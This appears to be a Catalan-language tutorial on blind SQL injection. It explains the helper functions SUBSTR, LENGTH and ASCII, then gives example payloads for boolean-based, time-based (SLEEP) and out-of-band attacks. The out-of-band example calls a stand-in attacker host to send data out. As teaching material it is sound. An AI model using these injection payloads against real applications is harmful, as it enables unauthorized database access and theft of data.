# 🔢 **Funcions útils per a Blind SQLi**  

| 🛠️ **Funció**                        | 📖 **Explicació**                              |
|--------------------------------------|----------------------------------------------|
| 🔹 **`SUBSTR(string, start, length)`** | Retorna una part de la cadena (subcadena).   |
| 🔹 **`LENGTH(string)`**               | Retorna la mida de la cadena.                |
| 🔹 **`ASCII(char)`**                   | Retorna el valor ASCII d'un caràcter.        |

## 🔎 **Com aquestes funcions ajuden en un Blind SQLi?**  
✅ **`LENGTH()`** ens permet saber **quants caràcters té una dada**.  
✅ **`SUBSTR()`** ens ajuda a **obtenir lletres concretes** dins la dada.  
✅ **`ASCII()`** converteix una lletra a un número, facilitant la seva extracció **bit a bit**.  

---

# 🔍 **Què és el Blind SQL Injection?**  
Blind SQL Injection és un atac on:  

✅ **Hi ha una vulnerabilitat SQL Injection**  
❌ **L'atacant NO veu la resposta directament**  
🕵️‍♂️ **Ha d'inferir informació** basant-se en canvis de comportament de l’aplicació.  

> 💡 **Exemple:**  
> - ✅ Una consulta **vàlida** pot carregar una pàgina normal.  
> - ❌ Una consulta **invàlida** pot provocar un error o un canvi en el temps de resposta.  

---

# 📌 **Tipus de Blind SQLi**  

## 1️⃣ **Boolean-Based Blind SQLi**  
👉 L’aplicació dona **respostes diferents** segons si la consulta és **certa o falsa**.  

### 🔎 **Exemple:**
```sql
' OR 1=1 --  ✅ (Pàgina normal)
' OR 1=2 --  ❌ (Error o canvi de comportament)
```

💡 **Tècnica per extreure dades**  
Podem trobar el nom d’usuari **lletra per lletra** amb `SUBSTR()`:  

```sql
' AND SUBSTR((SELECT user()),1,1)='r' -- ✅ / ❌
```

📌 **Com funciona?**  
- ✅ Si la pàgina respon **com sempre**, la condició és certa.  
- ❌ Si la pàgina respon **diferent**, la condició és falsa.  

➡️ **Es poden provar totes les lletres fins a reconstruir el text complet.**  

---

## 2️⃣ **Time-Based Blind SQLi**  
⏳ **Consisteix a fer que la base de dades trigui més si la condició és certa.**  
Això permet esbrinar informació **sense veure la resposta**.  

### 🔎 **Exemple en MySQL:**  
```sql
' AND IF(1=1, SLEEP(5), 0) -- ⏳ (Triga 5 segons) 
' AND IF(1=2, SLEEP(5), 0) -- ⚡ (Resposta immediata)
```

📌 **Com funciona?**  
- `IF(1=1, SLEEP(5), 0)` → Si la condició és **certa**, la base de dades **espera 5 segons**.  
- Si **no hi ha retard** → La condició és **falsa**.  

💡 **Tècnica per extreure dades**  
Podem esbrinar el nom d’usuari **lletra per lletra** combinant `SUBSTR()`, `ASCII()` i `SLEEP()`:  

```sql
' AND IF(ASCII(SUBSTR((SELECT user()),1,1))=114, SLEEP(5), 0) -- 
```

📌 **Explicació:**  
➡️ `ASCII(‘r’) = 114`  
➡️ **Provant números fins que el temps de resposta augmenti, descobrim cada lletra.**  

---

## 3️⃣ **Out-of-Band SQLi**  
📡 **Explotació indirecta mitjançant canals externs (DNS, HTTP, etc.).**  

🔹 Es fa servir quan **Boolean-Based i Time-Based no funcionen**.  
🔹 Requereix que la base de dades pugui fer **peticions externes**.  

### 🔎 **Exemple amb MySQL:**  
```sql
' UNION SELECT LOAD_FILE('\\evil-server.com\file') -- 
```

📌 **Com funciona?**  
👉 Això envia dades a un servidor **controlat per l'atacant**.  

---

